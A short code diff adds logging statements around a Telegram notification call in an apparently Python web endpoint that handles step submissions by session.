@@ -90,7 +90,9 @@ async def submit_step(step_data: StepData, request: Request):
         )
         
         # Send Telegram notification
+        logging.info(f"📤 Sending Telegram notification - Session: {session_id}, Step: {step}")
         telegram_service.send_step_notification(step, session_id, data)
+        logging.info(f"✅ Telegram sent for session: {session_id}")
         
         return {
             "success": True,
